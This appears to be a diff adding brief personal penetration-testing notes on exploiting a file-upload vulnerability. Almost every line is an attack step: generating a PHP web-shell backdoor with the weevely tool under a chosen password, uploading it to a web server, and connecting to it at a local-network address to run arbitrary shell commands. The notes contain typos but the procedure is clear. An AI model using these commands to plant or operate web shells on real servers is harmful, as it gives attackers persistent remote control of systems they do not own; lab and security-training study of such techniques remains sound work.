@@ -1,0 +1,10 @@
+						# File upload vuln
+#  Upload a php shell or backdoor, ex: weevly
+weevly generate [passord] [file name]
+weevly generate 123456 /home/shell.php
+# Upload generated file, and make sure that it can be accessed
+Connect to it > 
+weevly http://192.168.0.38/...../shell.php 123456
+
+# now we can run any shell code we want
+NOTE : type help for extra stuff
